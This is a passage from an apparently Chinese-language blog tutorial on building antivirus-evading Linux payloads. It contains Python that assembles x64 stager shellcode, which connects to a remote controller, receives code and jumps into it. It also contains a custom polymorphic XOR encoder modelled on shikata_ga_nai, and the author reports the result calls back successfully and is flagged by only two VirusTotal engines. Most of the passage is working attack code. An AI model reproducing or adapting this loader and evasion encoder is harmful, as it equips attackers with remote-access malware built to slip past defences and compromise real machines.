                encoded_host=encoded_host,
                encoded_port = encoded_port
            )
        else:
            shellcode = '''
            mmap:
                xor    rdi, rdi
                push   0x9
                pop    rax
                cdq
                mov    dh, 0x10
                mov    rsi, rdx
                xor    r9, r9
                push   0x22
                pop    r10
                mov    dl, 0x7
                syscall 
                test   rax, rax
                js failed
                push  {retry_count}  
                pop    r9
                push   rax
                push   0x29
                pop    rax
                cdq
                push   0x2
                pop    rdi
                push   0x1
                pop    rsi
                syscall 
                test   rax, rax
                js failed
                xchg   rdi, rax
            connect:
                mov    rcx, {encoded_host}{encoded_port}
                push   rcx
                mov    rsi, rsp
                push   0x10
                pop    rdx
                push   0x2a
                pop    rax
                syscall 
                pop    rcx
                test   rax, rax
                jns    recv
            handle_failure:
                dec    r9
                jz     failed
                push   rdi
                push   0x23
                pop    rax
                push   0x0
                push   0x5
                mov    rdi, rsp
                xor    rsi, rsi
                syscall              
                pop    rcx
                pop    rcx
                pop    rdi
                test   rax, rax
                jns    connect
            failed:
                push   0x3c
                pop    rax
                push   0x1
                pop    rdi
                syscall
            recv:
                pop    rsi
                push   0x7E
                pop    rdx
                syscall 
                test   rax, rax
                js     failed
                jmp    rsi
            '''.format(
                retry_count = retry_count,
                encoded_host=encoded_host,
                encoded_port = encoded_port.replace("0x","")
            )
        # print(shellcode)
        try:
            encoding, count = ks.asm(shellcode)
            return encoding
        except k.KsError as e:
            print("ERROR: %s" %e)
            return []
主要是利用 keystone 这个汇编器对代码进行汇编，然后写入到elf文件中。  
上述代码运行成功后，可以根据选择的架构生成 `64` 或者 `32` 位的elf文件，并且经过测试，功能都是正常的。
但是这样生成的二进制和利用 metasploit 直接生成的毫无差别，所以并不免杀。
接下来我们就尝试编写自己的编码器，使得可以完全构建出免杀的文件。
## 编写shellcode编码器
在上一篇文章中，主要写了编码器 `x86/shikata_ga_nai`
比较容易被识别的一些静态特征，本文也不做太多的深入研究，我们就简单的修改metasploit的encoder `x86/shikata_ga_nai`
的代码，试图去除这些比较明显的静态特征，看是否能够满足当前的免杀需求。
首先我们模仿一下编码器 `x86/shikata_ga_nai` 的代码结构，来生成一个用来解密 shellcode 的
decoder_sub,代码实现如下:
    def generate_shikata_block(shellcode):
        import random
        if ARCH == "x86":
            regs = [ "eax","ebx","ecx","edx","esi","edi" ]
            stack_base = "ebp"
            stack_head = "esp"
            addr_size = 0x4
        else:
            regs = [ "rax","rbx","rcx","rdx","rsi","rdi"  ] 
            stack_base = "rbp"
            stack_head = "rsp"  
            addr_size = 0x8 
        fpus = []
        fpus += [ bytes([0xd9,i])  for i in  range(0xe8,0xee+1)   ]
        fpus += [ bytes([0xd9,i])  for i in  range(0xc0,0xcf+1)   ]
        fpus += [ bytes([0xda,i])  for i in  range(0xc0,0xdf+1)   ]
        fpus += [ bytes([0xdb,i ])  for i in  range(0xc0,0xcf+1)   ]
        fpus += [ bytes([0xdd,i ])  for i in  range(0xc0,0xcf+1)   ]
        # fpus += [ b"\xd9\xd0",b"\xd9\xe1",b"\xd9\xf6",b"\xd9\xf7",b"\xd9\xe5" ]
        ks = k.Ks(k.KS_ARCH_X86,MODE)
        code = []
        # print( random.choice(fpus) )
        def append_code(code,asm=None,bytes_code=None,compile=True):
            '''
              code = [
                    {
                        "index":"当前指令偏移",
                        "asm":"助记符",
                        "bytes_code":[12,34] # 编译后的整形
                    }
                ]
            '''
            if not len(code):
                index = 0
            else:
                last = code[-1]
                index = last["index"] + len(last["bytes_code"])
            if not compile:
                code.append({
                    "index":index,
                    "asm":asm,
                    "bytes_code":[i for i in bytes_code]
                })
            else:
                try:
                    encoding, count = ks.asm(asm)
                    code.append({
                        "index":index,
                        "asm":asm,
                        "bytes_code":encoding
                    })
                except k.KsError as e:
                    print("ERROR: %s" %e)
                    return []
            return code
        code = append_code( 
            code,
            asm="mov {},{}".format( stack_base,stack_head )
            )
        # code += []
        code = append_code(
            code,
            asm = "sub {},{}".format( stack_head, addr_size * 0x4 )
        )
        reg_caches = []
        reg_caches.extend( ["rcx","ecx"] )
        reg_1 = random.choice(reg_caches)
        while reg_1 in reg_caches:
            reg_1 = random.choice(regs)
        code = append_code(
            code,
            asm = "mov {},{}".format( reg_1,stack_head)
        )
        #fpus command
        code = append_code(
            code,
            asm = "fpus",
            bytes_code = random.choice( fpus ),
            compile=False
        )
        # print(code)
        # code += ["mov {},{}".format( reg_1,stack_head)] 
        location_ss = random.randint(3,12) 
        # code += ["fnstenv [{} - {}]".format(reg_1,hex(location_ss * 4))]
        code = append_code(
                code,
                asm = "fnstenv [{} - {}]".format(reg_1,hex(location_ss * 4))
            )
        code = append_code(
            code,
            asm="sub {},{}".format( stack_head,hex( (location_ss - 3)*4 ) )
        )
        code = append_code(
            code,
            asm = "pop {}".format(reg_1)
        )
        # print(code)
        # code += ["sub esp,{}".format( hex( (location_ss - 3)*4 ) ) ]
        # code += ["pop {}".format(reg_1)]
        key_table = [ i for i in range(0x80,0xFF) ]
        key = bytes([ random.choice( key_table ) for i in range(4)  ])
        print("[*] the decode key is: {}.".format(key))
        key_int = struct.unpack("<I",key)[0]
        reg_2 = random.choice( reg_caches )
        while reg_2 in reg_caches:
            reg_2 = random.choice(regs)
        if reg_2.startswith("r"):
            reg_2 = reg_2.replace("r","e")
        # print( "mov {},{}".format(reg_2,key_int )  )
        code = append_code(
            code,
            asm="mov {},{}".format(reg_2,key_int )
        )
        # code += ["mov {},{}".format(reg_2,key_int )]
        code = append_code(
            code,
            asm="xor ecx,ecx"
        )
        # code += [ "xor ecx,ecx" ] # loop count
        code_length = len(shellcode) # 修正这个长度
        print("[*] len of shellcode : {}.".format(code_length))
        code_length += 4 + (4 - (code_length & 3)) & 3
        print("[*] encode length is: {}.".format(code_length))
        code_length //= 4
        if (code_length <= 255):
            # code += ["mov {},{}".format("cl",code_length) ]
            code = append_code(
                code,
                asm="mov {},{}".format("cl",code_length)
            )
        elif (code_length <= 65536):
            # code += ["mov {},{}".format("ecx",code_length) ]
            code = append_code(
                code,
                asm="mov {},{}".format("ecx",code_length)
            )
        dd = 0x23 # header length
        '''
           # 查 intel 手册得知
           xor [reg+offset],reg # 此变长指令在 offset <= 0x7F 为定长三字节
        '''
        code = append_code(
            code,
            asm="decode: xor [{}+{}],{}".format( reg_1,dd,reg_2 )
        )
        decode_label = code[-1]["index"]
        # code += [ "decode: xor [{}+{}],{}".format( reg_1,dd,reg_2 ) ] # 查 intel 手册得知此指令为 3 字节
        # code += [ "add {},[{}+{}]".format( reg_2,reg_1,dd ) ] # 先不实现这个逻辑
        code = append_code(
            code,
            asm = "add {},4".format(reg_1)
        )
        current_index = code[-1]["index"] + len( code[-1]["bytes_code"] ) 
        # append loop 
        code = append_code(
            code,
            asm="loop decode",
            bytes_code=b"\xe2" + bytes( [0xFF - (current_index + 2 - decode_label) + 1 ] ),
            compile=False
        )
        # print(code)
        all_code_length = code[-1]["index"] + len(code[-1]["bytes_code"])
        fpus_addr = 0
        print("[*] original code:")
        # 计算fpus指令地址之后的指令长度，来修正 xor 指令的偏移
        for t,i in enumerate(code):
            print("\t{}:\t{}\t\t{}".format(i["index"],i["asm"],i["bytes_code"]))
            asm = i["asm"]
            index = i["index"]
            if "fpus" in asm:
                fpus_addr = index
            if "decode" in asm:
                code[t]["bytes_code"][2] = all_code_length - fpus_addr - ( code_length * 4 - len(shellcode) )
                break
        print("[*] fix code:")
        decodeSub = []
        for t,i in enumerate(code):
            print( "\t{}:\t{}\t\t{}".format(i["index"],i["asm"],i["bytes_code"]))
            decodeSub += i["bytes_code"]
        return decodeSub,shellcode,code_length*4,key
        # code += ["loop decode"]
**代码是临时写的，所以逻辑比较乱。等以后有时间了开发一个框架出来，再进行优化吧**
接下来把 decodeSub 和 shellcode 的内容依据 `key` 进行加密：
    def xor_encrypt(decodeSub,shellcode,length,key):
        key = [i for i in key]
        allcode = decodeSub  + shellcode
        subCode = allcode[-length:]
        for k,v in enumerate(subCode):
            subCode[k] ^= key[ k%4 ]
        allcode[-length:] = subCode
        return allcode
经过测试，shellcode 的功能正常，可以正常会连控制端:
上传到vt上进行检测:
竟然两个引擎报毒，这是出乎了我的意料，不过没关系，我们日后再慢慢解决。本节内容到此为止。